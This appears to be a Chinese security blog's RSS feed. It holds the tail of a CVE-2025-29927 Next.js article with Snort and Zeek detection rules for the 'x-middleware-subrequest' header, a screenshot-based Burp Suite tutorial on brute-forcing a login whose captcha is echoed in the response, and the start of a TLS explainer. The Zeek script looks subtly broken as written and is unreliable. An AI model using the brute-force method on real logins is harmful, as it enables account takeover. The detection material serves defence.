&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;现在，我们可以运行 Snort 并测试其检测效果。下面的终端以控制台模式运行 Snort，以演示警报触发过程。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali@yrc-2404:/var/log/snort$ sudo snort -q -l /var/log/snort -i ens5 -A console -c /etc/snort/snort.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;03/24-20:16:13.424299  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;**&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1:10000001:1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; HTTP &lt;span class=&#34;s1&#34;&gt;&amp;#39;x-middleware-request&amp;#39;&lt;/span&gt; header detected &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;**&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Priority: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; 10.10.142.69:49432 -&amp;gt; 10.10.219.251:3000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;了解zeek&#34;&gt;[了解]Zeek
&lt;/h3&gt;&lt;p&gt;Zeek 为网络流量中的威胁检测提供了更全面的方案。对于 CVE -2025-29927，可以使用以下 Zeek 规则：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CVE_2025_29927&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;redef&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;enum&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LOG&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_policy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PolicyHook&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IGNORE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;event&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http_header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is_orig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;x-middleware-subrequest&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;middleware&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timestamp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start_time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;note&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;CVE_2025_29927_Exploit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Detected HTTP header associated with CVE-2025-29927&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           &lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;notice_info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;CVE-2025-29927 Exploit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;The HTTP header &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; associated with CVE-2025-29927 was detected&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;确保此文件以 &lt;code&gt;.zeek&lt;/code&gt; 扩展名保存在 Zeek 脚本的配置目录中。您需要修改 &lt;code&gt;local.zeek&lt;/code&gt; 文件，通过添加 &lt;code&gt;@load ./cve_2025_29927.zeek&lt;/code&gt; 来包含此脚本。&lt;/p&gt;
&lt;p&gt;最后，通过 &lt;code&gt;sudo zeekctl deploy&lt;/code&gt; 重启 Zeek 以应用配置更改。如果成功，当检测到 CVE -2025-29927 时， Zeek 将会发出警报：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Connnection_ID] The HTTP header &amp;#34;x-middleware-subrequest&amp;#34; associated with CVE-2025-29927 was detected
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;p&gt;查看关于发现此漏洞的原始帖子，许多流行应用程序的源代码中仍然潜伏着许多漏洞。对于已修复的版本，用户需要升级到以下版本：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Next.js 15.x 应该升级到 15.2.3&lt;/li&gt;
&lt;li&gt;Next.js 14.x 应该升级到 14.2.25&lt;/li&gt;
&lt;li&gt;Next.js 13.x 应该升级到 13.5.9&lt;/li&gt;
&lt;li&gt;Next.js 12.x 应该升级到 12.3.5&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果修补不可行，唯一的解决方法是阻止包含 &lt;code&gt;x-middleware-subrequest&lt;/code&gt; 的 HTTP 请求到达您的 Web 应用程序。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Burpsuite利用宏爆破回显在响应包的验证码网页</title>
        <link>https://Yerucrem.github.io/p/burpsuite%E5%88%A9%E7%94%A8%E5%AE%8F%E7%88%86%E7%A0%B4%E5%9B%9E%E6%98%BE%E5%9C%A8%E5%93%8D%E5%BA%94%E5%8C%85%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BD%91%E9%A1%B5/</link>
        <pubDate>Tue, 15 Apr 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/burpsuite%E5%88%A9%E7%94%A8%E5%AE%8F%E7%88%86%E7%A0%B4%E5%9B%9E%E6%98%BE%E5%9C%A8%E5%93%8D%E5%BA%94%E5%8C%85%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BD%91%E9%A1%B5/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png" alt="Featured image of post Burpsuite利用宏爆破回显在响应包的验证码网页" /&gt;&lt;h1 id=&#34;burpsuite利用宏爆破回显在响应包的验证码网页&#34;&gt;Burpsuite利用宏爆破回显在响应包的验证码网页
&lt;/h1&gt;&lt;h2 id=&#34;演示网页&#34;&gt;演示网页
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153222039.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153222039&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;简介&#34;&gt;简介
&lt;/h2&gt;&lt;p&gt;该网页的验证码是非图片形式的，当发送申请验证码请求后会直接显示在响应包中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415152232525.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415152232525&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;思路&#34;&gt;思路
&lt;/h2&gt;&lt;p&gt;利用Burpsuite自带的宏(macro)[setting-&amp;gt;session-&amp;gt;macro]和会话处理规则，实现自动化抓取验证码放在payload中实现爆破。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415152401054.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415152401054&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415152407313.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415152407313&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;下面是具体流程&lt;/p&gt;
&lt;h2 id=&#34;过程&#34;&gt;过程
&lt;/h2&gt;&lt;p&gt;首先我们需要抓取获取到验证码URL的该过程的响应包。本案例，我刷新验证码即可抓取。&lt;/p&gt;
&lt;p&gt;抓取后可以直接放行（这一步的目的是记录此步骤，以便于在宏的设置中，可以在历史URL找到）&lt;/p&gt;
&lt;h3 id=&#34;添加条目&#34;&gt;添加条目
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415152637276.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415152637276&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;找到刚刚放掉的验证码刷新的url&#34;&gt;找到刚刚放掉的验证码刷新的URL
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415152708283.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415152708283&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;选取后确定，回到上级界面&lt;/p&gt;
&lt;h3 id=&#34;项目设置&#34;&gt;项目设置
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415152824504.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415152824504&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;点击添加&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415152839160.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415152839160&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在响应包中找到需要选取的验证码片段，burpsuite会自动帮忙标注号起始位置和结束位置。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415152938226.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415152938226&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;注意需要设置参数名称，这里的参数名称需要与要爆破处的参数名称相同。&lt;/p&gt;
&lt;p&gt;这里设置：&lt;code&gt;inputCode&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153039784.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153039784&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;三次确认后回到会话页面。&lt;/p&gt;
&lt;h3 id=&#34;配置会话处理规则&#34;&gt;配置会话处理规则
&lt;/h3&gt;&lt;p&gt;添加会话处理规则&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153117095.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153117095&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;添加规则行为-&amp;gt;选择运行宏&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153340315.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153340315&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在其中配置如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153513921.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153513921&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;点击确认返回上级界面后选择配置范围&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153540301.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153540301&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果严格来讲，只负责爆破模块的话，可以只选择intuder&lt;/p&gt;
&lt;p&gt;URL需要选择包含所有URL，或者自己配置自己爆破的URL范围&lt;/p&gt;
&lt;p&gt;确认即可。&lt;/p&gt;
&lt;h2 id=&#34;测试&#34;&gt;测试
&lt;/h2&gt;&lt;p&gt;抓取登录时的数据包&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153809897.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153809897&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以简单的单机发送，进行重发。此时如果配置正确可以看到inputCode部分已经可以随着每次重发进行更新。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153903860.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153903860&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250415153912868.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250415153912868&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;注意&#34;&gt;注意
&lt;/h2&gt;&lt;p&gt;注意命名全局变量时，要命名与进行爆破时的要替换的地方的名称相同。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>网络安全协议</title>
        <link>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE/</link>
        <pubDate>Tue, 08 Apr 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE/</guid>
        <description>&lt;h2 id=&#34;tls&#34;&gt;TLS
&lt;/h2&gt;&lt;p&gt;在某一时刻，您只需要一个数据包捕获工具来读取网络上用户的所有聊天、电子邮件和密码。攻击者将其网卡设置为混杂模式的情况并不少见，即捕获所有数据包，包括那些不是发往它的数据包。他们稍后会检查所有数据包捕获并获取毫无戒心的受害者的登录凭据。用户无法采取任何措施来阻止其登录密码以明文形式发送。如今，以明文形式发送登录凭据的服务已经很少见。&lt;/p&gt;
&lt;p&gt;在 1990 年代初期，Netscape Communications 认识到在万维网上进行安全通信的必要性。他们最终开发了 SSL（安全套接字层），并于 &lt;strong&gt;1995&lt;/strong&gt; 年发布了 SSL 2.0 作为第一个公共版本。&lt;strong&gt;1999&lt;/strong&gt; 年，Internet 工程任务组 （IETF） 开发了 TLS（传输层安全性）。虽然非常相似，但 TLS 1.0 是 SSL 3.0 的升级版，并提供了各种改进的安全措施。&lt;strong&gt;2018&lt;/strong&gt; 年，TLS 对其协议进行了重大改革，并发布了 TLS 1.3。目的不是记住确切的日期，而是实现开发当前版本的 TLS（即 TLS 1.3）所投入的工作量和时间。二十多年来，每个版本都有很多东西需要学习和改进。&lt;/p&gt;
&lt;p&gt;与其前身 SSL 一样，TLS 是一种在 OSI 模型的传输层运行的加密协议。它允许客户端和服务器之间通过不安全的网络进行安全通信。我们所说的安全是指机密性和完整性;TLS 确保没有人可以读取或修改交换的数据。请花点时间想一想，如果在网上购物、网上银行，甚至在线消息和电子邮件，而无法保证网络数据包的机密性和完整性，那会是什么样子。如果没有 TLS，我们将无法使用 Internet 来处理许多应用程序，这些应用程序现在已成为我们日常生活的一部分。&lt;/p&gt;
&lt;p&gt;如今，数十种协议已经通过简单地添加 TLS 进行了安全升级。示例包括 HTTP、DNS、MQTT 和 SIP，它们已成为 HTTPS、DoT（DNS over TLS）、MQTTS 和 SIPS，其中附加的“S”由于使用了 SSL/TLS，代表安全。在以下任务中，我们将访问 HTTPS、SMTPS、POP3S 和 IMAPS。&lt;/p&gt;
&lt;h3 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h3&gt;&lt;p&gt;我们不会讨论 TLS 握手;但是，如果您好奇，可以查看&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/r/room/networksecurityprotocols&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;网络安全协议&lt;/a&gt;室。我们将简要介绍如何设置和使用 TLS。&lt;/p&gt;
&lt;p&gt;对于每个需要标识自身的服务器（或客户端），第一步是获取签名的 TLS 证书。通常，服务器管理员会创建证书签名请求 （CSR） 并将其提交给证书颁发机构 （CA）;CA 验证 CSR 并颁发数字证书。收到（签名的）证书后，可以使用它向其他人识别服务器（或客户端），这些人可以确认签名的有效性。为了让主机确认签名证书的有效性，需要在主机上安装签名机构的证书。在非数字世界中，这类似于识别各种权威机构的邮票。下面的屏幕截图显示了 Web 浏览器中安装的受信任颁发机构。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250408021405300.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250408021405300&#34;
	
	
&gt;&lt;/p&gt;
